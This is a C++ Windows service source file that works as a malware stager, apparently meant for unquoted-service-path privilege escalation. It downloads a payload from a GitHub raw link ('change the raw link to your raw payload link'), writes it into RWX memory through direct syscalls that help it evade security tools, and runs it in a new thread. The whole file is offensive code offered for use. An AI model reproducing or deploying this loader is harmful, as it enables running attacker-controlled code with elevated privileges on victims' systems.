#include <iostream>
#include <vector>
#include <Windows.h>
#include <WinInet.h>
#include "syscalls.h"

typedef HINTERNET(WINAPI* pInternetOpen)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
typedef HINTERNET(WINAPI* pInternetOpenUrl)(HINTERNET, LPCWSTR, LPCWSTR, DWORD, DWORD, DWORD_PTR);
typedef BOOL(WINAPI* pInternetReadFile)(HINTERNET, LPVOID, DWORD, LPDWORD);
typedef BOOL(WINAPI* pInternetCloseHandle)(HINTERNET);

std::vector<unsigned char> downloadContent(const wchar_t* url) {
    std::vector<unsigned char> content;

    HMODULE hWinINet = LoadLibrary(L"wininet.dll");
    if (!hWinINet) {
        std::cerr << "LoadLibrary() failed: " << GetLastError() << std::endl;
        return content;
    }

    pInternetOpen InternetOpen = reinterpret_cast<pInternetOpen>(GetProcAddress(hWinINet, "InternetOpenW"));
    pInternetOpenUrl InternetOpenUrl = reinterpret_cast<pInternetOpenUrl>(GetProcAddress(hWinINet, "InternetOpenUrlW"));
    pInternetReadFile InternetReadFile = reinterpret_cast<pInternetReadFile>(GetProcAddress(hWinINet, "InternetReadFile"));
    pInternetCloseHandle InternetCloseHandle = reinterpret_cast<pInternetCloseHandle>(GetProcAddress(hWinINet, "InternetCloseHandle"));

    if (!InternetOpen || !InternetOpenUrl || !InternetReadFile || !InternetCloseHandle) {
        std::cerr << "GetProcAddress() failed: " << GetLastError() << std::endl;
        FreeLibrary(hWinINet);
        return content;
    }

    HINTERNET hInternet = InternetOpen(L"Content Downloader", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (hInternet) {
        HINTERNET hUrlFile = InternetOpenUrl(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
        if (hUrlFile) {
            DWORD bytesRead;
            unsigned char buffer[4096];
            while (InternetReadFile(hUrlFile, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
                content.insert(content.end(), buffer, buffer + bytesRead);
            }
            InternetCloseHandle(hUrlFile);
        }
        else {
            std::cerr << "InternetOpenUrl() failed: " << GetLastError() << std::endl;
            InternetCloseHandle(hInternet);
        }
        InternetCloseHandle(hInternet);
    }
    else {
        std::cerr << "InternetOpen() failed: " << GetLastError() << std::endl;
    }

    FreeLibrary(hWinINet);
    return content;
}

void executeContent(const std::vector<unsigned char>& content) {
    
    void* exec = NULL;
    SIZE_T size = content.size();
    NtAllocateVirtualMemory(GetCurrentProcess(), &exec, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    SIZE_T bytesWritten;
    NtWriteVirtualMemory(GetCurrentProcess(), exec, static_cast<PVOID>(const_cast<unsigned char*>(content.data())), content.size(), &bytesWritten);

    HANDLE hThread;
    NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, GetCurrentProcess(), (PTHREAD_START_ROUTINE)exec, exec, FALSE, 0, 0, 0, NULL);

    NtWaitForSingleObject(hThread, FALSE, NULL);

}

// Service Control Handler function
void WINAPI ServiceControlHandler(DWORD control) {
    switch (control) {
    case SERVICE_CONTROL_STOP:
        // Stop the service
        // ...
        break;
    case SERVICE_CONTROL_INTERROGATE:
        // Respond with current service status
        // ...
        break;
    default:
        break;
    }
}

void WINAPI ServiceMain(DWORD argc, LPTSTR* argv) {
    // Register the Service Control Handler function, change the service name to your name
    SERVICE_STATUS_HANDLE hServiceStatus = RegisterServiceCtrlHandler(L"unquotedsvc", ServiceControlHandler);

    if (hServiceStatus) {
        // Set service status to SERVICE_RUNNING
        SERVICE_STATUS serviceStatus = { SERVICE_WIN32_OWN_PROCESS, SERVICE_RUNNING, SERVICE_ACCEPT_STOP, NO_ERROR, 0, 0, 0 };
        SetServiceStatus(hServiceStatus, &serviceStatus);

        // Download content from GitHub raw link, change the raw link to your raw payload link 
        const wchar_t* url = L"https://github.com/your_repo/raw/main/update_emp_2.bin";
        std::vector<unsigned char> content = downloadContent(url);

        if (!content.empty()) {
            executeContent(content);
        }
        else {
            std::cerr << "Failed to download content." << std::endl;
        }

        // Set service status to SERVICE_STOPPED
        serviceStatus.dwCurrentState = SERVICE_STOPPED;
        SetServiceStatus(hServiceStatus, &serviceStatus);
    }
}



int main() {
    // Initialize the SERVICE_TABLE_ENTRY structure, change the service name to your name 
    SERVICE_TABLE_ENTRY serviceTable[] = {
        { const_cast<LPWSTR>(L"unquotedsvc"), ServiceMain },
        { NULL, NULL }
    };

    // Start the service control dispatcher with the service table
    if (!StartServiceCtrlDispatcher(serviceTable)) {
        std::cerr << "StartServiceCtrlDispatcher() failed: " << GetLastError() << std::endl;
        return 1;
    }

    return 0;
}

